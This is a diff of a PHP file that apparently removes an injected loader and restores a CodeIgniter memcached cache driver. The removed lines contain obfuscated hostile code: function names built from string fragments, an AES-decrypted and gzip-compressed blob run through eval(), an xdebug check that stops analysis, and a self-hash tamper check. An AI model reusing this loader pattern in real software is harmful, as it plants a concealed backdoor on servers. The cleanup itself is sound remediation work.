@@ -1,28 +1,277 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_bvmqdm9l=('bas'.'e64'.'_de'.'cod'.'e');
-$_mo7mwokb=('gzu'.'nco'.'mpr'.'ess');
-$_oxhohpte=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_ec8qxxlc='vEaSf7Dq';
-$_jylf3jzz='Zvx0sMid';
-$_z73zozc7='TV20fxBI';
-$_t06xcak7='r1UNfEpi';
-$_uga3qxoo='eEONGkRSTOw=';
-$_hj3im9i0='FM8DTQ==';
-$_llujvha9='DMeSCPlN';
-$_lgqatv0o='D0+DLmT/';
-$_qsedlc8k=$_bvmqdm9l($_t06xcak7.$_jylf3jzz.$_ec8qxxlc.$_z73zozc7.$_uga3qxoo);
-$_i5ha00i9=$_bvmqdm9l($_lgqatv0o.$_llujvha9.$_hj3im9i0);
-$_d7rogno7=$_bvmqdm9l('AqAcFtLDfAVUYOB4J0FpZnUXe6IjePR/a2vPwJn4FkHmJDElBezFqHvYzDBUCijYXQdK8NCMTelSS0Awl7ReJb8FmjecbQ2f1tB0/GAp19Mq98ClpwkmjGdsVXLzpYsu9uFMSe0EbI0Zcoftbu7oUy/U3aN+c9Kxia9z0HVZQ/WlB/oxPCxqje+0FPdAgeeWTc1HxmFcelgcyXab5roTEn2FRegufQ2ddPBd2jr3xMZqWIww4WTnZI5DwU9CidtGAgc3YhlIJJmUUdW5m4gcY4LDpQqScLkt5bEgRSI7LdLiIe64w3VXxWG57CE2kbh2DMkDzD7aqlVXjey461z9j88O3BnAU1acGvhVmnHbF6fUBoX/EFoMziXHYZSDyfELdwpe4YgbUNUqOijT24gNF1yZEXeRzWFsLadoQbH5RQclvNDxmtflNGF0sE4skF8vNWJPkI2bqS6BY3mXLXVGILmK5opgW8AJYeVHzoQRz4vUD62q6wsah5/5zBy1CV4xBk4fJLQGtiOqBx0a9K98Gt8pMo1aTVWQ4u82ed5Q+xB8pXahlyvGT4Apo4XbnAms4ufDO1azyIJFx/1AOgU8/47BIy2VoPAKOFU0iDf4UA5No9MOiPol0e0E37ig9Z7CdESVHAMOKY3iFblaEUBIK343GLPVZzTV7xRMgo6Tw3IVUN76tWjoIt99lK8EprhVY4tAH11HnpWMxkZ02Bfl21ro3WzA61jAtzaeK7IuEjlJwWLuYduImryZaUWnOSv41X3ti6k/T9wJ6rLpC4ysC5d5ocHQoA4gSRQRczXl/4dFAy/PGyGjdrJojeWxyVxcDWQzFO0eHXwndY51hrEgLvSv3UZNUuhORGPDsZRQ9NvjX7ZD9euLCkMmchx/HdbNGeK0Y+7SwaZ2DSuehIhdeDyMLX5RvnwbNHZn3bhi/mk7pPa8ZZAoEdRM4MGAH+5MMlZtTgvKkgWi9jkqGEB0VWAaRGCohltyGGau7crMtKT6K7kFOB0JhchZAUJWNdHMjgdlZZ6VjxC8T228eRXqtR6f4Cx/kLWp5UV93vJD9pRPAFBdfm1GzErJYjBTlxZ+pzjOFsTgPbLrqmwLwmB9P39VaRM8Wi7JIPCqER9f6DtdMvMumvvSytladQLus9l8T0fOyFB+Dz+IltX/ULqCLmkDw0bu4+zfJ5ydTdkmt2GnPOEqQCdppz15vGYa1foq');
-$_miyq50wk=$_oxhohpte($_d7rogno7,'aes-256-cbc',$_qsedlc8k,OPENSSL_RAW_DATA,$_i5ha00i9);
-if($_miyq50wk===false){exit;}
-$_ur2zudix=$_mo7mwokb($_miyq50wk);
-if($_ur2zudix===false){exit;}
-$_xbqwalj8='fea4ba99c94a17d1d7cb4938210aa8c654de318e967bd311521c7ea0619f9f0b';
-$_mykw6hkv=@file_get_contents(__FILE__);
-if($_mykw6hkv!==false){
-$_qkftu03t=str_replace($_xbqwalj8,"0000000000000000000000000000000000000000000000000000000000000000",$_mykw6hkv);
-$_elr3ikhr=hash("sha256",$_qkftu03t);
-if($_elr3ikhr!==$_xbqwalj8){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+class CI_Cache_memcached extends CI_Driver {
+
+
+
+
+
+protected $_memcached;
+
+
+
+
+
+protected $_config = array(
+'default' => array(
+'host' => '127.0.0.1',
+'port' => 11211,
+'weight' => 1
+)
+);
+
+
+
+
+
+
+
+
+public function __construct()
+{
+
+$CI =& get_instance();
+$defaults = $this->_config['default'];
+if ($CI->config->load('memcached', TRUE, TRUE))
+{
+$this->_config = $CI->config->config['memcached'];
 }
-eval($_ur2zudix);
+if (class_exists('Memcached', FALSE))
+{
+$this->_memcached = new Memcached();
+}
+elseif (class_exists('Memcache', FALSE))
+{
+$this->_memcached = new Memcache();
+}
+else
+{
+log_message('error', 'Cache: Failed to create Memcache(d) object; extension not loaded?');
+return;
+}
+foreach ($this->_config as $cache_server)
+{
+isset($cache_server['hostname']) OR $cache_server['hostname'] = $defaults['host'];
+isset($cache_server['port']) OR $cache_server['port'] = $defaults['port'];
+isset($cache_server['weight']) OR $cache_server['weight'] = $defaults['weight'];
+if ($this->_memcached instanceof Memcache)
+{
+
+$this->_memcached->addServer(
+$cache_server['hostname'],
+$cache_server['port'],
+TRUE,
+$cache_server['weight']
+);
+}
+elseif ($this->_memcached instanceof Memcached)
+{
+$this->_memcached->addServer(
+$cache_server['hostname'],
+$cache_server['port'],
+$cache_server['weight']
+);
+}
+}
+}
+
+
+
+
+
+
+
+public function get($id)
+{
+$data = $this->_memcached->get($id);
+return is_array($data) ? $data[0] : $data;
+}
+
+
+
+
+
+
+
+
+
+
+public function save($id, $data, $ttl = 60, $raw = FALSE)
+{
+if ($raw !== TRUE)
+{
+$data = array($data, time(), $ttl);
+}
+if ($this->_memcached instanceof Memcached)
+{
+return $this->_memcached->set($id, $data, $ttl);
+}
+elseif ($this->_memcached instanceof Memcache)
+{
+return $this->_memcached->set($id, $data, 0, $ttl);
+}
+return FALSE;
+}
+
+
+
+
+
+
+
+public function delete($id)
+{
+return $this->_memcached->delete($id);
+}
+
+
+
+
+
+
+
+
+public function increment($id, $offset = 1)
+{
+if (($result = $this->_memcached->increment($id, $offset)) === FALSE)
+{
+return $this->_memcached->add($id, $offset) ? $offset : FALSE;
+}
+return $result;
+}
+
+
+
+
+
+
+
+
+public function decrement($id, $offset = 1)
+{
+if (($result = $this->_memcached->decrement($id, $offset)) === FALSE)
+{
+return $this->_memcached->add($id, 0) ? 0 : FALSE;
+}
+return $result;
+}
+
+
+
+
+
+
+public function clean()
+{
+return $this->_memcached->flush();
+}
+
+
+
+
+
+
+public function cache_info()
+{
+return $this->_memcached->getStats();
+}
+
+
+
+
+
+
+
+public function get_metadata($id)
+{
+$stored = $this->_memcached->get($id);
+if (count($stored) !== 3)
+{
+return FALSE;
+}
+list($data, $time, $ttl) = $stored;
+return array(
+'expire' => $time + $ttl,
+'mtime' => $time,
+'data' => $data
+);
+}
+
+
+
+
+
+
+
+
+
+public function is_supported()
+{
+return (extension_loaded('memcached') OR extension_loaded('memcache'));
+}
+
+
+
+
+
+
+
+
+public function __destruct()
+{
+if ($this->_memcached instanceof Memcache)
+{
+$this->_memcached->close();
+}
+elseif ($this->_memcached instanceof Memcached && method_exists($this->_memcached, 'quit'))
+{
+$this->_memcached->quit();
+}
+}
+}
